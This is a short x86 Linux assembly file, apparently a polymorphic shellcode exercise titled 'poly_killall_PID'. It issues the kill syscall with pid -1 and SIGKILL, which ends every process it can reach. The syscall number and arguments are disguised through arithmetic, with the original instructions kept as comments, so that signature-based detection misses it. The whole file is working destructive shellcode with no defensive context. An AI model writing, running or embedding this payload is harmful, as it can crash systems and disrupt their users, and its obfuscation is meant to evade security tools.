; Name: poly_killall_PID.asm
 
global _start 
section .text 
    
_start: 

    xor eax,eax 
    
    ; xor ecx, ecx
    mov ecx, eax 
  
    ; mov al, 37
    mov al, 27        
    add al, 10 

    cld 
  
    ; push byte -1
    push byte -2         
    pop ebx            
    inc ebx 
    
    mov cl, 9           
    int 0x80

